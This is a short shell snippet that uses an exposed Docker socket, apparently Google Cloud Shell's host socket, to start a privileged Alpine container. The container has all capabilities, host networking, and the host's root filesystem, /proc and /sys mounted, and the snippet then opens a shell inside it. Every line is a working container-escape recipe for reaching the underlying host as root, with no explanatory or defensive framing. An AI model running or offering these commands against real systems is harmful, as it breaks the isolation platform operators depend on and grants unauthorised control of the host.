# create a privileged container with host root filesystem mounted
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name YOUR-CONTAINER-NAME -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start YOUR-CONTAINER-NAME
sudo docker -H unix:///google/host/var/run/docker.sock exec -it YOUR-CONTAINER-NAME /bin/sh